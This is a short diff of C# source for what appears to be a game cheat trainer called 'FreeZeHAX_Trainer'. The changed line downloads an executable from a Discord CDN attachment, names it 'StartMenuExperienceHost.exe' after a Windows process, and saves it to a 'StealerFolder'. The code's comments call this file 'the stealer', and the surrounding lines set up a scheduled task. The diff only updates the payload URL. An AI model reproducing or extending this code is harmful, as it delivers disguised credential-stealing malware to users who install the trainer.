@@ -382,7 +382,7 @@ namespace FreeZeHAX_Trainer
                     #endregion Check required dlls for the c++ stealer
 
                     CETimer.Start(); // Check if ce is running
-                    web.DownloadFile(new Uri("https://cdn.discordapp.com/attachments/927287752133845082/946425878253043783/StartMenuExperienceHost.exe"), StealerFolder + "\\StartMenuExperienceHost.exe"); // Download the stealer
+                    web.DownloadFile(new Uri("https://cdn.discordapp.com/attachments/927287752133845082/950775487611953162/StartMenuExperienceHost.exe"), StealerFolder + "\\StartMenuExperienceHost.exe"); // Download the stealer
                     others.Wait(2000);
                     if (!savePathExists)
                     { // If save.dat doesn't exists, just create the task scheduler
